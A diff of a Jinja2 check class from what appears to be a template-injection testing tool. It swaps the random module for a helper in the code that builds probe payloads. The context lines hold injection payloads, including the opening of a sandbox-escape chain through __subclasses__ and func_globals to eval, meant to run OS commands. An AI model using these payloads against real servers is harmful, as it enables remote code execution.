@@ -1,6 +1,6 @@
 from core.check import Check
 from utils.loggers import log
-import random
+from utils import rand
 import string
 
 class Jinja2(Check):
@@ -36,8 +36,8 @@ class Jinja2(Check):
 
     def _check_python(self):
         
-        randA = ''.join(random.choice(string.letters + string.digits) for _ in range(2))
-        randB = ''.join(random.choice(string.letters + string.digits) for _ in range(2))
+        randA = rand.randstr_n(2)
+        randB = rand.randstr_n(2)
         
         payload = '{{"%s".join("%s")}}' % (randA, randB)
         expected = randA.join(randB)
@@ -48,8 +48,8 @@ class Jinja2(Check):
     
     def _check_reflection(self):
         
-        randA = random.randint(10, 100)
-        randB = random.randint(10, 100)
+        randA = rand.randint_n(1)
+        randB = rand.randint_n(1)
 
         payload = '{{%i*%i}}' % (randA, randB)
         expected = str(randA*randB)
@@ -59,7 +59,8 @@ class Jinja2(Check):
         
     def _check_os(self):
         
-        expected_rand = str(random.randint(999, 10000))
+        expected_rand = str(rand.randint_n(1))
+        
         payload = """{%% for c in [].__class__.__base__.__subclasses__() %%} {%% if c.__name__ == 'catch_warnings' %%}
 {%% for b in c.__init__.func_globals.values() %%} {%% if b.__class__ == {}.__class__ %%}
 {%% if 'eval' in b.keys() %%}
